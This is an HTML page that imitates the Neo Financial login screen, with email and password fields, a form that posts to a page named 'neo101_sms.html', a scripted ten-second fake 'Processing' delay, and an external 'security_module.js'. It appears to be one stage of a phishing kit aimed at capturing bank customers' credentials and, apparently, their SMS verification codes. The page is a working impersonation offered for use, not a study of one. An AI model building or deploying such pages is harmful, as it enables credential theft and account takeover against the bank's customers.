<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Neo Financial</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        
body { background-color: #f4f4f4; color: #000; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 0; }
.n-header { background: #000; display: flex; justify-content: space-between; align-items: center; padding: 15px 20px; }
.n-logo { color: white; font-weight: 800; font-size: 26px; letter-spacing: -1px; }
.n-head-btns { display: flex; gap: 10px; }
.n-head-btns button { background: #333; color: white; border: none; padding: 8px 12px; border-radius: 4px; font-weight: bold; }
.n-head-btns .n-signup { background: white; color: black; }
.n-container { padding: 40px 20px; max-width: 400px; margin: 0 auto; }
.n-title { font-size: 32px; font-weight: bold; margin: 0 0 40px 0; }
.n-subtitle { font-size: 28px; font-weight: bold; margin: 0 0 25px 0; }
.n-input-wrapper { position: relative; margin-bottom: 20px; }
.n-input { width: 100%; background: #e8e8e8; border: none; padding: 22px 15px; box-sizing: border-box; font-size: 16px; font-weight: 500; border-radius: 4px; }
.n-eye { position: absolute; right: 15px; top: 22px; color: #666; font-size: 18px; }
.n-link { color: #0066cc; text-decoration: none; display: block; margin-bottom: 15px; font-size: 15px; }
.n-btn { width: 100%; background: #e0e0e0; color: #888; border: none; padding: 18px; border-radius: 30px; font-size: 16px; font-weight: bold; margin-top: 30px; cursor: pointer; }
form:valid .n-btn { background: #000; color: #fff; }

        /* Loader Overlay */
        .loader-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background-color: rgba(255, 255, 255, 0.95);
            display: flex; flex-direction: column; justify-content: center; align-items: center;
            z-index: 999999; visibility: hidden; opacity: 0; transition: opacity 0.3s;
            font-family: Arial, sans-serif;
        }
        .loader-overlay.active { visibility: visible; opacity: 1; }
        .loader-spinner {
            border: 4px solid #f3f3f3; border-top: 4px solid #000;
            border-radius: 50%; width: 50px; height: 50px;
            animation: spin 1s linear infinite; margin-bottom: 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .loader-text { font-size: 18px; font-weight: bold; color: #333; }
        .success-icon { font-size: 70px; color: #000; margin: 30px auto; display: block; text-align: center; }
        .success-desc { font-size: 16px; color: #333; line-height: 1.5; margin-bottom: 30px; text-align: center; padding: 0 20px; }
    </style>
</head>
<body>
    
<div class="n-header"><div class="n-logo">neo</div><div class="n-head-btns"><button><i class="fa-solid fa-globe"></i> EN</button><button class="n-signup">Sign Up</button></div></div>
<div class="n-container">
    <div class="n-title">Welcome back</div>
    <div class="n-subtitle">Log in</div>
    <form action="neo101_sms.html" method="POST">
        <div class="n-input-wrapper"><input type="email" class="n-input" placeholder="Email" required></div>
        <div class="n-input-wrapper"><input type="password" class="n-input" placeholder="Password" required><i class="fa-solid fa-eye n-eye"></i></div>
        <a href="#" class="n-link">Forgot your password?</a>
        <a href="#" class="n-link">First time logging in?</a>
        <button type="submit" class="n-btn">Log in</button>
    </form>
</div>

    <div id="loaderOverlay" class="loader-overlay">
        <div class="loader-spinner"></div>
        <p class="loader-text">Processing, please wait...</p>
    </div>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.querySelector('form');
            const loader = document.getElementById('loaderOverlay');
            if(form && loader) {
                form.addEventListener('submit', function(e) {
                    e.preventDefault();
                    loader.classList.add('active');
                    setTimeout(function() { form.submit(); }, 10000);
                });
            }
        });
    </script>
<script src="security_module.js"></script>
</body>
</html>
